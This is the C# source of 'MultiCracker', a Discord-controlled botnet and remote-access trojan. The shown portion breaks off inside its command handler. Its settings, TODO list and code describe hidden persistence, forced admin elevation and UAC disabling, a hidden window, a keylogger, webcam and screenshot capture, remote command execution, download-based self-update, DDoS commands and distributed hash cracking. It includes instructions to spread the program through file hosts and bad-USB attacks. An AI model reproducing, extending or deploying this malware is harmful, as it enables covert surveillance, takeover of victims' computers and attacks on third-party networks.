using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Security.Cryptography;
using Discord;
using Discord.WebSocket;
using System.Threading.Tasks;
using Microsoft.VisualBasic.Logging;
using Discord.Commands;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading.Channels;
using System.Net;
using System.Net.Sockets;
using System.Numerics;
using Microsoft.Win32;
using System.Security.Principal;
using System.Reflection;
using System.Reactive;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using System.Diagnostics.Metrics;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.TaskbarClock;
using Newtonsoft.Json.Linq;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Drawing.Imaging;
using System.IO;
using System.Drawing;
using System.Linq;

namespace MultiCracker
{
    public partial class Form1 : Form
    {
        // ----------------------------------------
        // TODO:
        // ----------------------------------------
        // DONE: Add a way to split the cracking between bots
        // DONE: Add a way to set the hash to crack
        // DONE: Add a way to set the hash algorithm (More algorithms)
        // Faster splitting (splitting without needing to to through all password combinations.) for !split, (Not really needed but yeah...)
        // DONE: Better checking for if bots are active or not
        // DONE: Add DDoS commands for the bots (Full on botnet style...)
        // DONE: Bool for hiding form.
        // DONE: Add a way to install hidden persistence.
        // DONE: Quick bad USB install.
        // DONE: Add a way to send the log file to the C2.
        // DONE: Add a way to elevate to admin.
        // DONE: Disable UAC.
        // DONE: Add a way to uninstall persistence.
        // Save hash settings to profiles. (file)
        // DONE: Save passwords and hashes to seperate channels to be used later.
        // DONE: Add a way to load passwords and hashes from seperate channels.
        // DONE: Add a command for executing CMD commands on the bot.
        // DONE: Make new method of ForcesSS (Forces Start/Stop) With <start1>,<end1>;<start2>,<end2>;<start3>,<end3>...
        // DONE: Modify so that it removes the channel then creates a new one instead of just deleting all messages.
        // DONE: Fix the HashesPerSeconds counter when using ForcesSS. (It used to count not tried passwords so it boosted the score.)
        // DONE: Make it so that bots automatically find and crack hashes from other bots that has disconnected.
        // DONE: Add so that bots automatically will continue cracking when done with current split in auto mode.
        // DONE: Make bots when done with split in auto mode, send the new splits without the done one to splits channel for other bots to use.
        // Save current crack-run to temp file on disk every heartbeat. (So it can be used later in case of disconnection.)
        // DONE: Command to generate a new auto hash auto target, so i can easily set how many splits it should be in the hash.
        // DONE: Add a way to start multi-cracker RAT on the target machine.
        // Command !microphone.
        // DONE: Command !screenshot. (All screens)
        // DONE: Command !webcam.
        // Fix token validation checker.
        // DONE: File management for RAT.
        // DONE: Keylogger for RAT.
        // Better filter for RAT keylogger, its good but could be better.
        // Keylogger not working when compiling to one file.
        // DONE: Make screenshot working for entire screen when only client is only using one screen.
        // DONE: Not being able to restart RAT if its channel is deleted.
        // ----------------------------------------


        // ----------------------------------------
        // Below are settings for the program.
        // Go through all of them and change them to your liking.
        // ----------------------------------------

        // --- KEEP IN MIND YOU NEED TO COMPILE TO ONE FILE!! (For special) --- //
        bool SpecialPersistent = true; // If true, the bot will install persistence on the target machine. (This is a special version of persistence that is harder to detect for some computers.)
        // --- KEEP IN MIND YOU NEED TO COMPILE TO ONE FILE!! (For special) --- //
        bool NormalPersistent = false; // If true, the bot will install persistence on the target machine.
        bool UAConStart = true; // If true, the bot will ask for elevation to admin on start.
        bool AutoCrack = true; // If true, the bot will automatically start cracking if it finds a hash with the auto-crack feature.
        bool AutoRAT = true; // If true, the RAT will start on the target machine at launch.
        private bool DebugMode = true; // If false, the window will be hidden and the program will run in the background.
        
        // Categories
        //string BOT_CATEGORY = "CLIENTS"; // The category for the bot logs in the server.
        string BOT_CATEGORY = "CLIENTS"; // The category for the bot logs in the server.
        //string RAT_CATEGORY = "RAT"; // The category for the RAT channel in the server.
        string RAT_CATEGORY = "RAT"; // The category for the RAT channel in the server.
        
        // Communication
        string BOT_TOKEN = "<BOT TOKEN main multi-cracker>"; // The main bot token for multi-cracker.
        private static string ratPrimaryToken = "<BOT TOKEN (Can be main token)>"; // The token for the RAT. (Could be same as main bot token.)
        private static string ratAlternativeToken = "<BOT TOKEN (IS NOT USED IN BELOW 2.2.0)>"; // Secondary token for the RAT. (Not used in 2.2.0)
        
        string registryName = "MultiCracker"; // Name of the registry key. (Special and normal)
        // Persistence settings (Normal)
        string dropPath = "C:\\Windows\\debug\\multi"; // Path to drop the file/create folder multi.
        string fileName = "multiCracker.exe"; // Name of the .exe file to drop.
        // Persistence settings (Special)
        string fileNameSpecial = "multiCracker.exe"; // Name of the .log file to drop with special persistence.

        // ----------------------------------------
        // Now you are done with the settings.
        //
        // 1. Compile and run the program, by pressing CTRL + B.
        // 2. Navigate to the bin folder where you will see the MultiCracker.exe file. (At Your-Directory\Multi-Cracker\MultiCracker\bin\Debug\net6.0-windows\MultiCracker.exe)
        // 3. Test the program by running it. (Double click the .exe file)
        // 4. If you want to hide the window, go back to the code and change the DebugMode variable to false. And go to step 1.
        // 5. If everything works as expected, you can now start to distribute the program to your other computers. (I would recommend to upload the program and its .dll files to a file hosting service like Mega.)
        // And then when you want to use the program, you can just download it and run it. (such as with a bad USB attack).
        // ----------------------------------------

        // Discord
        bool FoundCorrectPass = false;
        string elsesPassword = "N/A";
        string elsesHash = "N/A";
        List<string> computers = new List<string>();

        bool EmergencySTOP = false;
        string hash;
        
        // Warning level
        int currentWarningLevel = 0;
        int currentWarningLevelRAT = 0;

        // Version
        string currentVersion = "2.2.0";

        // Force start/end
        int forceEnd = int.MaxValue; // As high as possible (default)
        int forceStart = 0; // All accepted. (0 is the default)
        string forcesSS = $"0,{int.MaxValue}"; // Basicly every ; is a new start/end for example: "0,200;400,500;800,1000" 


        // Hash settings
        string Algorithm = "SHA256";
        bool UseNumbers = true;
        bool UseLetters = false;
        bool UseSymbols = false;
        bool UseCapitals = false;
        int MaxLength = 3;
        int MinLength = 1;
        static BigInteger globalCombinations = 0;

        // Auto-settings
        string AutoHash = "";
        string AutoAlgorithm = "SHA256";
        bool AutoUseNumbers = false;
        bool AutoUseLetters = false;
        bool AutoUseSymbols = false;
        bool AutoUseCapitals = false;
        int AutoMaxLength = 3;
        int AutoMinLength = 1;
        string AutoForcesSS = $"0,{int.MaxValue}";

        // RAT
        bool RATRunning = false;

        // Keylogger
        bool KeyloggerRunning = false;
        string KeyloggerLog = "";
        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, IntPtr wParam, uint lParam);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x100;

        // Screenshot
        public const int DESKTOPVERTRES = 0x75;
        public const int DESKTOPHORZRES = 0x76;
        [DllImport("gdi32.dll")]
        public static extern int GetDeviceCaps(IntPtr hDC, int index);



        // Counter for number of tries
        int counter = 0;
        BigInteger AccualCount = 0;

        // Create timer
        static Stopwatch stopwatch = new Stopwatch();

        public Form1()
        {
            InitializeComponent();

            // Start Discord thread
            Task.Run(() => DiscordThread(BOT_TOKEN));

            if (AutoRAT)
            {
                Task.Run(() => RAT());
            }
        }


        // Debug or not
        private void Form1_Load(object sender, EventArgs e)
        {
            if (!DebugMode)
            {
                Visible = false; // Hide form window.
                ShowInTaskbar = false; // Remove from taskbar.
                Opacity = 0;
                Log(new LogMessage(LogSeverity.Info, "Debug", "Debug mode disabled. (Hidden Window)"));
            }
            else
            {
                Log(new LogMessage(LogSeverity.Info, "Debug", "Debug mode enabled."));
            }
            // Kill all other instances of this program
            KillOtherInstances();
            // Add persistence
            if (UAConStart)
            {
                // Check if admin
                bool isAdmin = IsAdministrator();
                if (!isAdmin)
                {
                    // Elevate to admin
                    ElevateToAdmin();
                }
            }
        }

        // Kill all other instances of this program
        private void KillOtherInstances()
        {
            // Get the current process.
            Process currentProcess = Process.GetCurrentProcess();

            // Get all processes running on the local computer.
            Process[] localAll = Process.GetProcesses();

            // Loop through the processes.
            foreach (Process process in localAll)
            {
                // Check if the process is the same as the current process.
                if (process.Id != currentProcess.Id)
                {
                    // Check if the process is the same as the current process.
                    if (process.ProcessName == currentProcess.ProcessName)
                    {
                        // Kill the process.
                        process.Kill();
                    }
                }
            }
        }


        // Discord
        private DiscordSocketClient _client;
        public DiscordSocketClient _ratClient;
        private async Task DiscordThread(string Token)
        {
            var config = new DiscordSocketConfig
            {
                LogLevel = LogSeverity.Info,
                GatewayIntents = GatewayIntents.All // Enable all intents
            };

            _client = new DiscordSocketClient(config);
            _client.Log += Log;

            await _client.LoginAsync(TokenType.Bot, Token);
            await _client.StartAsync();

            _client.Ready += async () =>
            {
                // Create new text channel in the server with the name "bot-logs" if it doesn't exist
                await CreateBotLogsChannel();
            };


            _client.MessageReceived += HandleMessage;
        }

        private static async Task<bool> IsTokenValid(string token)
        {
            var client = new DiscordSocketClient();
            try
            {
                await client.LoginAsync(TokenType.Bot, token);
                await client.StartAsync();
                await Task.Delay(-1); // Keep the bot running
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Token validation error: {ex.Message}");
                return false;
            }
        }

        public Task Log(LogMessage arg)
        {
            // Handle logging (e.g., display in a TextBox)
            Invoke(new Action(() =>
            {
                txtOutput.AppendText(arg + "\r\n");
            }));

            return Task.CompletedTask;
        }

        private async Task HandleMessage(SocketMessage arg)
        {
            // Ignore system messages and messages from other bots
            bool allowBotMessages = true;
            if (allowBotMessages == false)
            {
                if (arg.Author.IsBot)
                    return;
            }
            if (arg is not IUserMessage message)
                return;

            // Trim the message content to remove leading and trailing whitespaces
            string trimmedContent = message.Content.Trim();

            // Check if the message is from created channel
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
            string computerNameRaw = Environment.MachineName;
            string computerName = computerNameRaw.ToLower();
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
            if (message.Channel != channel)
            {
                // The message is not from the created channel
                return;
            }

            if (!string.IsNullOrEmpty(trimmedContent))
            {
                Log(new LogMessage(LogSeverity.Info, "Message", $"Received message: {trimmedContent}"));
                // BASIC
                if (trimmedContent == "!help")
                {
                    // Send a message to the channel
                    List<string> messagesBasic = new List<string>();
                    List<string> messagesCracking = new List<string>();
                    List<string> messagesOther = new List<string>();
                    List<string> messagesDebug = new List<string>();
                    List<string> messagesPersistence = new List<string>();
                    List<string> messagesDDoS = new List<string>();
                    List<string> messagesRAT = new List<string>();

                    messagesBasic.Add($"Hello! I am a bot that can crack passwords and more. Here are my commands: (**Version is {currentVersion}**)\r\n");
                    messagesBasic.Add("**-------------- BASIC --------------**\r\n");
                    messagesBasic.Add("**!help** - Displays this message.\r\n");
                    messagesBasic.Add("**!kys** - Bot commits suicide...\r\n");
                    messagesBasic.Add("**!restart** - Restarts the bot.\r\n");
                    messagesCracking.Add("\r\n**-------------- CRACKING --------------**\r\n");
                    messagesCracking.Add("**!crack** - Starts cracking the password.\r\n");
                    messagesCracking.Add("**!crackAll** - Makes all bots (including itself) crack the password its selected.\r\n");
                    messagesCracking.Add("**!stop** - Stops cracking the password.\r\n");
                    messagesCracking.Add("**!setHash** - Sets the hash to crack.\r\n");
                    messagesCracking.Add("**!setAlgorithm** - Sets the algorithm to use.\r\n");
                    messagesCracking.Add("**!status** - Sends status.\r\n");
                    messagesCracking.Add("**!info** - Sends info.\r\n");
                    messagesCracking.Add("**!reset** - Resets the bot.\r\n");
                    messagesCracking.Add("**!setMax <length>** - Sets the passwords max length.\r\n");
                    messagesCracking.Add("**!setMin <length>** - Sets the passwords min length.\r\n");
                    messagesCracking.Add("**!setLetters <true/false>** - Sets the password to use letters.\r\n");
                    messagesCracking.Add("**!setNumbers <true/false>** - Sets the password to use numbers.\r\n");
                    messagesCracking.Add("**!setSymbols <true/false>** - Sets the password to use symbols.\r\n");
                    messagesCracking.Add("**!setCapitals <true/false>** - Sets the password to use capitals.\r\n");
                    messagesCracking.Add("**!split** - Splits the cracking between bots.\r\n");
                    messagesCracking.Add("**!start <start-count>, <end-count>** - Starts cracking <start1>,<end1>;<start2>,<end2>;<start3>,<end3>. (Mostly for bots to use...)\r\n");
                    messagesCracking.Add("**!resetStart** - Resets the start and end count.\r\n");
                    messagesOther.Add("\r\n**-------------- OTHER --------------**\r\n");
                    messagesOther.Add("**!elevate** - Ask for elevation from user to admin on bot computer.\r\n");
                    messagesOther.Add("**!update <url-to-your-powershell-script-for-downloading-new-version>** - Updates the bot to your newer version of multi-cracker.\r\n");
                    messagesOther.Add("**!cmd <command>** - Execute commands with CMD on bot's computer.\r\n");
                    messagesDebug.Add("\r\n**-------------- DEBUG --------------**\r\n");
                    messagesDebug.Add("**!log** - Sends entire log as .txt file.\r\n");
                    messagesDebug.Add("**!check <hash>** - Checks \"forces\" channel for missing passwords.\r\n");
                    messagesDebug.Add("**!auto** - Will trigger the auto crack feature.\r\n");
                    messagesDebug.Add("**!createAuto <Number of Splits>** - Creates a new auto-target for bots to target with current settings.\r\n");
                    messagesPersistence.Add("\r\n**-------------- PERSISTENCE --------------**\r\n");
                    messagesPersistence.Add("**!install** - Installs persistence.\r\n");
                    messagesPersistence.Add("**!uninstall** - Uninstalls persistence.\r\n");
                    messagesPersistence.Add("**!disableUAC** - Disables UAC.\r\n");
                    messagesDDoS.Add("\r\n**-------------- DDoS --------------**\r\n");
                    messagesDDoS.Add("**!ddos <ip> <port> <time>** - Starts a DDoS attack on the target.\r\n");
                    messagesDDoS.Add("**!stopddos** - Stops all DDoS attacks.\r\n");
                    messagesRAT.Add("\r\n**-------------- RAT --------------**\r\n");
                    messagesRAT.Add("**!rat** - Starts a RAT on the target machine.\r\n");


                    // Send all Basic messages in one message
                    await message.Channel.SendMessageAsync(string.Join("", messagesBasic));

                    // Send all Cracking messages in one message
                    await message.Channel.SendMessageAsync(string.Join("", messagesCracking));

                    // Send all Other messages in one message
                    await message.Channel.SendMessageAsync(string.Join("", messagesOther));

                    // Send all Debug messages in one message
                    await message.Channel.SendMessageAsync(string.Join("", messagesDebug));

                    // Send all Persistence messages in one message
                    await message.Channel.SendMessageAsync(string.Join("", messagesPersistence));

                    // Send all DDoS messages in one message
                    await message.Channel.SendMessageAsync(string.Join("", messagesDDoS));

                    Log(new LogMessage(LogSeverity.Info, "Message", $"Sent help message."));
                }
                else if (trimmedContent == "!kys")
                {
                    // Send a discord message
                    await message.Channel.SendMessageAsync("Unaliving myself...");

                    // Choose a random last word
                    Random random = new Random();
                    int randomNumber = random.Next(0, 10);
                    string[] lastWords = {
                        "I told you I was sick. - Spike Milligan",
                        "I'm bored with it all. - Winston Churchill",
                        "Either this wallpaper goes, or I do. - Oscar Wilde",
                        "It's very beautiful over there. - Thomas Edison",
                        "I'd hate to die twice. It's so boring. - Richard Feynman",
                        "I am not the least afraid to die. - Charles Darwin",
                        "Why is this happening? - Lady Nancy Astor",
                        "I've had 18 straight whiskies. I think that's the record. - Dylan Thomas",
                        "This is no way to live! - Groucho Marx",
                        "I should never have switched from Scotch to Martinis. - Humphrey Bogart",
                        "I'm going to the bathroom to read. - Elvis Presley",
                        "I am ready. - Woodrow Wilson",
                        "What is life? It is the flash of a firefly in the night. - Crowfoot",
                        "I hope the exit is joyful and I hope never to return. - Frida Kahlo",
                        "I'm losing it. - Frank Sinatra",
                        "I feel great. - Elvis Presley",
                        "It's better to burn out than to fade away. - Kurt Cobain",
                        "Goodbye, everybody. - Hart Crane",
                        "I have offended God and mankind because my work did not reach the quality it should have. - Leonardo da Vinci",
                        "I'm going to the bathroom to read. - Elvis Presley",
                        "I've had a hell of a lot of fun and I've enjoyed every minute of it. - Errol Flynn",
                        "Why not? After all, it belongs to him. - Charlie Chaplin (when asked why he was looking down at the ground before he died)",
                        "What's the big hurry? - Ronald Reagan",
                        "I'm bored. - James Brown",
                        "Now comes the mystery. - Henry Ward Beecher",
                        "I've never felt better. - Douglas Fairbanks",
                        "Please put out that light, James. - Louisa May Alcott"
                    };
                    string lastWord = lastWords[randomNumber];

                    // Send a discord message
                    await message.Channel.SendMessageAsync(lastWord);

                    // Remove ratted-channel
                    // Go through all channels and find the one that starts with "ratted-" and contains the computer name
                    guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                    foreach (var channel1 in guild.TextChannels)
                    {
                        if (channel1.Name.StartsWith("ratted-") && channel1.Name.Contains(computerName))
                        {
                            // Delete the channel
                            await channel1.DeleteAsync();
                        }
                    }

                    // Kill the bot
                    Environment.Exit(0);
                }
                else if (trimmedContent == "!restart")
                {
                    // Send a discord message
                    await message.Channel.SendMessageAsync("Restarting...");

                    // Remove ratted-channel
                    // Go through all channels and find the one that starts with "ratted-" and contains the computer name
                    guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                    foreach (var channel1 in guild.TextChannels)
                    {
                        if (channel1.Name.StartsWith("ratted-") && channel1.Name.Contains(computerName))
                        {
                            // Delete the channel
                            await channel1.DeleteAsync();
                        }
                    }

                    // Start its own process
                    Process.Start(Application.ExecutablePath);
                }
                // CRACKING
                else if (trimmedContent == "!crack")
                {
                    counter = 0;
                    AccualCount = 0;
                    stopwatch.Reset();
                    // Simulate a button press of btnStartCracking
                    btnStartCracking_Click(null, null);
                    await message.Channel.SendMessageAsync("Cracking started... Use **!status** it see its progress!");
                }
                else if (trimmedContent == "!crackAll")
                {
                    // Find all other bots (including itself)
                    computers = FindOthers();
                    // Log the active computers
                    foreach (var computer in computers)
                    {
                        // Send discord message (!crack)
                        guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                        channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computer}");
                        await channel.SendMessageAsync("!crack");
                        Log(new LogMessage(LogSeverity.Info, "Cracking", $"Started cracking with bot-{computer}..."));
                    }
                    // Send discord message
                    await message.Channel.SendMessageAsync("Cracking started on all bots... Use **!status** it see its progress!");
                }
                else if (trimmedContent == "!stop")
                {
                    btnStopCracking_Click(null, null);
                    await message.Channel.SendMessageAsync("Pushed Emergency Eutton!!! This will halt any cracking.");
                }
                else if (trimmedContent.StartsWith("!setHash"))
                {
                    // Find the argument after !sethash
                    string argument = trimmedContent.Substring(9);
                    hash = argument;
                    txtTargetHash.Text = hash;

                    await message.Channel.SendMessageAsync($"Set hash to: **{hash}**");
                }
                else if (trimmedContent.StartsWith("!setAlgorithm"))
                {
                    // Find the argument after !setAlgorithm
                    string argument = trimmedContent.Substring(14);

                    // Check if the argument is valid
                    if (argument == "SHA256" || argument == "SHA512" || argument == "MD5" || argument == "SHA1" || argument == "SHA384" || argument == "HMACSHA256" || argument == "HMACSHA512" || argument == "HMACMD5")
                    {
                        Algorithm = argument;
                        await message.Channel.SendMessageAsync($"Set algorithm to: **{Algorithm}**");
                        textBox6.Text = Algorithm;
                    }
                    else
                    {
                        await message.Channel.SendMessageAsync($"Invalid argument. Please use \"SHA256\", \"SHA512\", \"MD5\", \"SHA1\", \"SHA384\", \"HMACSHA256\", \"HMACSHA512\" or \"HMACMD5\".");
                    }
                }
                else if (trimmedContent.StartsWith("!setMax"))
                {
                    // Find the argument after !setMaxLength
                    string maxLength = trimmedContent.Substring(7);
                    MaxLength = Convert.ToInt32(maxLength);
                    txtMax.Text = maxLength;

                    // Return responce with "Max length set to: <length>"
                    await message.Channel.SendMessageAsync($"Max length set to: **{maxLength}**");

                    Log(new LogMessage(LogSeverity.Info, "Password", $"Max length set to: {maxLength}"));
                }
                else if (trimmedContent.StartsWith("!setMin"))
                {
                    // Find the argument after !setMinLength
                    string minLength = trimmedContent.Substring(7);
                    MinLength = Convert.ToInt32(minLength);
                    txtMin.Text = minLength;

                    // Return responce with "Min length set to: <length>"
                    await message.Channel.SendMessageAsync($"Min length set to: **{minLength}**");

                    Log(new LogMessage(LogSeverity.Info, "Password", $"Min length set to: {minLength}"));
                }
                else if (trimmedContent == "!status" || trimmedContent == "!s")
                {
                    if (counter > 0)
                    {
                        Invoke(new Action(() =>
                        {
                            string status = GetStatus();
                            message.Channel.SendMessageAsync(status);
                            Log(new LogMessage(LogSeverity.Info, "Status", $"Status: {status}"));
                        }));
                    }
                    else
                    {
                        // Send a message to the channel
                        await message.Channel.SendMessageAsync("Cracking has not started yet. Use **!crack**...");
                        Log(new LogMessage(LogSeverity.Info, "Status", $"Cracking has not started yet."));
                    }
                }
                else if (trimmedContent == "!info")
                {
                    string info = GetInfo();
                    await message.Channel.SendMessageAsync(info);
                    Log(new LogMessage(LogSeverity.Info, "Info", $"Info: {info}"));
                }
                else if (trimmedContent == "!reset")
                {
                    hash = "";
                    Algorithm = "SHA256";
                    UseNumbers = false;
                    UseLetters = false;
                    UseSymbols = false;
                    UseCapitals = false;
                    MaxLength = 8;
                    MinLength = 5;
                    counter = 0;
                    AccualCount = 0;
                    stopwatch.Reset();
                    forceEnd = int.MaxValue;
                    forceStart = 0;
                    await message.Channel.SendMessageAsync("Reset settings.");
                    Log(new LogMessage(LogSeverity.Info, "Message", "Reset settings."));
                }
                else if (trimmedContent.StartsWith("!setLetters"))
                {
                    // Find the argument after !sethash
                    string argument = trimmedContent.Substring(12);

                    if (argument == "true")
                    {
                        UseLetters = true;
                        await message.Channel.SendMessageAsync("Letters enabled.");
                    }
                    else if (argument == "false")
                    {
                        UseLetters = false;
                        await message.Channel.SendMessageAsync("Letters disabled.");
                    }
                    else
                    {
                        await message.Channel.SendMessageAsync("Invalid argument. Please use \"true\" or \"false\".");
                    }
                }
                else if (trimmedContent.StartsWith("!setNumbers"))
                {
                    // Find the argument after !sethash
                    string argument = trimmedContent.Substring(12);

                    if (argument == "true")
                    {
                        UseNumbers = true;
                        await message.Channel.SendMessageAsync("Numbers enabled.");
                    }
                    else if (argument == "false")
                    {
                        UseNumbers = false;
                        await message.Channel.SendMessageAsync("Numbers disabled.");
                    }
                    else
                    {
                        await message.Channel.SendMessageAsync("Invalid argument. Please use \"true\" or \"false\".");
                    }
                }
                else if (trimmedContent.StartsWith("!setCapitals"))
                {
                    // Find the argument after !sethash
                    string argument = trimmedContent.Substring(13);

                    if (argument == "true")
                    {
                        UseCapitals = true;
                        await message.Channel.SendMessageAsync("Capitals enabled.");
                    }
                    else if (argument == "false")
                    {
                        UseCapitals = false;
                        await message.Channel.SendMessageAsync("Capitals disabled.");
                    }
                    else
                    {
                        await message.Channel.SendMessageAsync("Invalid argument. Please use \"true\" or \"false\".");
                    }
                }
                else if (trimmedContent.StartsWith("!setSymbols"))
                {
                    // Find the argument after !sethash
                    string argument = trimmedContent.Substring(12);

                    if (argument == "true")
                    {
                        UseSymbols = true;
                        await message.Channel.SendMessageAsync("Symbols enabled.");
                    }
                    else if (argument == "false")
                    {
                        UseSymbols = false;
                        await message.Channel.SendMessageAsync("Symbols disabled.");
                    }
                    else
                    {
                        await message.Channel.SendMessageAsync("Invalid argument. Please use \"true\" or \"false\".");
                    }
                }
                else if (trimmedContent == "!split")
                {
                    // Find other bots
                    computers = FindOthers();
                    // Log the active computers
                    foreach (var computer in computers)
                    {
                        Log(new LogMessage(LogSeverity.Info, "Discord", $"Found active computer: {computer}"));
                    }
                    // Split the cracking between the bots
                    int numberOfComputers = computers.Count;

                    // Calculate the number of combinations
                    BigInteger combinations = CalculateCombinations(UseNumbers, UseLetters, UseSymbols, UseCapitals, MaxLength, MinLength);
                    Log(new LogMessage(LogSeverity.Info, "Password", "Number of combinations: " + combinations));

                    // Calculate the number of combinations per bot
                    BigInteger combinationsPerBot = combinations / numberOfComputers;
                    Log(new LogMessage(LogSeverity.Info, "Password", "Number of combinations per bot: " + combinationsPerBot));

                    // Send out the settings to the other bots
                    foreach (var computer in computers)
                    {
                        // Access their own channel
                        guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                        channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computer}");

                        // Change "False/True" to "false/true" so that it works as argument.
                        string UseLettersString = UseLetters.ToString().ToLower();
                        string UseNumbersString = UseNumbers.ToString().ToLower();
                        string UseSymbolsString = UseSymbols.ToString().ToLower();
                        string UseCapitalsString = UseCapitals.ToString().ToLower();

                        // Send the settings
                        await channel.SendMessageAsync($"!setMax {MaxLength}");
                        await channel.SendMessageAsync($"!setMin {MinLength}");
                        await channel.SendMessageAsync($"!setLetters {UseLettersString}");
                        await channel.SendMessageAsync($"!setNumbers {UseNumbersString}");
                        await channel.SendMessageAsync($"!setSymbols {UseSymbolsString}");
                        await channel.SendMessageAsync($"!setCapitals {UseCapitalsString}");
                        await channel.SendMessageAsync($"!setHash {hash}");
                    }

                    // Split the possible passwords between the bots
                    // Generate passwords

                    // Create a list of passwords
                    List<string> passwords = new List<string>();

                    // Generate passwords
                    foreach (var password in GeneratePasswords(MinLength, MaxLength, UseLetters, UseNumbers, UseCapitals, UseSymbols))
                    {
                        // THIS IS WHERE IT TAKES A LONG TIME, I NEED TO FIND A WAY TO MAKE IT FASTER. Potential fix could be 
                        passwords.Add(password);
                    }

                    // Split the list of passwords between the bots
                    int numberOfPasswords = passwords.Count;
                    int passwordsPerBot = numberOfPasswords / numberOfComputers;
                    Log(new LogMessage(LogSeverity.Info, "Password", "Number of passwords per bot: " + passwordsPerBot));

                    // Take the first X passwords and send them to the first bot
                    // Take the next X passwords and send them to the next bot
                    // Repeat until all bots have gotten their passwords

                    // Create a list of lists of passwords
                    List<List<string>> passwordsPerBotList = new List<List<string>>();
                    Log(new LogMessage(LogSeverity.Info, "Password", "Number of lists of passwords: " + numberOfComputers));

                    // Create a list of passwords for each bot, and add it to the list of lists of passwords, send out passwordsPerBotList to the bots.
                    for (int i = 0; i < numberOfComputers; i++)
                    {
                        passwordsPerBotList.Add(new List<string>());
                        Log(new LogMessage(LogSeverity.Info, "Password", $"Created list of passwords for bot {i}"));


                        // Add passwords to the list of passwords for each bot
                        int botIndex = i % numberOfComputers;
                        if (i < passwordsPerBotList[botIndex].Count)
                        {
                            passwordsPerBotList[botIndex].Add(passwords[i]);
                            Log(new LogMessage(LogSeverity.Info, "Password", $"Added password {passwords[i]} to bot {botIndex}"));
                        }


                        // Send the passwords to the bots
                        // Figure out a start and end password for each bot
                        int start = 0;
                        int end = numberOfPasswords;
                        int splits = numberOfComputers;

                        List<Tuple<int, int>> splitRanges = SplitRange(start, end, splits);

                        // Display the result
                        foreach (var range in splitRanges)
                        {
                            Log(new LogMessage(LogSeverity.Info, "Password", $"Range: {range.Item1} - {range.Item2}"));
                        }

                        // Send "!start <start>, <end>" to each bot.
                        // Access their own channel
                        guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                        channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computers[i]}");

                        // Send the settings
                        await channel.SendMessageAsync($"!start {splitRanges[i].Item1}, {splitRanges[i].Item2}");
                    }

                }
                else if (trimmedContent.StartsWith("!start"))
                {
                    // LOOKS LIKE THIS: !start 0,100;300,500;700,1000

                    // Find the 2 argument after !start 
                    string argument = trimmedContent.Substring(7);
                    // Remove all spaces
                    argument = argument.Replace(" ", "");
                    // Split the argument by ";" to find each start and end point
                    string[] argumentsPoints = argument.Split(";");
                    // LOOKS LIKE THIS: 300,500

                    // Instead of (!start 0, 1000) have this (!start 0,200;400,500;700,1000)
                    // This way it can be split between more bots and if bots go offline it will still work.

                    string[] points = new string[argumentsPoints.Length];

                    int index = 0;  // Initialize the index variable
                    foreach (var point in argumentsPoints)
                    {
                        // LOOKS LIKE THIS: 300,500
                        // Add it to points[]
                        points[index] = point;  // Use the index variable

                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Password", $"Added point to points[]: {point}"));

                        // Split the point by "," to find the start and end
                        string[] argumentsPoint = point.Split(",");
                        // LOOKS LIKE THIS: 300

                        // Increment the index
                        index++;
                    }

                    // Set variables to the now finished string[]
                    forcesSS = string.Join("; ", points);

                    // Logging
                    Log(new LogMessage(LogSeverity.Info, "Password", $"Number of points: {index}"));
                    Log(new LogMessage(LogSeverity.Info, "Password", $"Points: {string.Join("; ", points)}"));
                    Log(new LogMessage(LogSeverity.Info, "Password", $"ForcesSS: {forcesSS}"));

                    // Send message to discord
                    var guild2 = _client.Guilds.FirstOrDefault(); // Get the first available guild
                    computerNameRaw = Environment.MachineName;
                    computerName = computerNameRaw.ToLower();
                    var channel2 = guild2.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
                    await channel2.SendMessageAsync($"Number of points: {index}");
                    await channel2.SendMessageAsync($"Points: {forcesSS}");


                }
                else if (trimmedContent == "!resetStart")
                {
                    forcesSS = $"0,{int.MaxValue}";
                    await message.Channel.SendMessageAsync($"Reset forces settings. (ForcesSS: {forcesSS})");
                    Log(new LogMessage(LogSeverity.Info, "Message", $"Reset forces settings. (ForcesSS: {forcesSS})"));
                }
                // OTHER
                else if (trimmedContent == "!elevate")
                {
                    // Check if admin
                    bool isAdmin = IsAdministrator();
                    if (!isAdmin)
                    {
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Elevating to admin...");
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Elevate", $"Elevating to admin..."));

                        // Elevate to admin
                        await Task.Run(() => ElevateToAdmin());
                    }
                    else
                    {
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Already admin.");
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Elevate", $"Already admin."));
                    }
                }
                else if (trimmedContent.StartsWith("!update"))
                {
                    // Find the argument after !update
                    string argument = trimmedContent.Substring(8);

                    // Update the bot
                    await message.Channel.SendMessageAsync($"Updating bot to link: **{argument}**");

                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Update", $"Updating bot to link: {argument}"));

                    // Update the bot
                    await Task.Run(() => UpdateBot(argument));
                }
                else if (trimmedContent.StartsWith("!cmd"))
                {
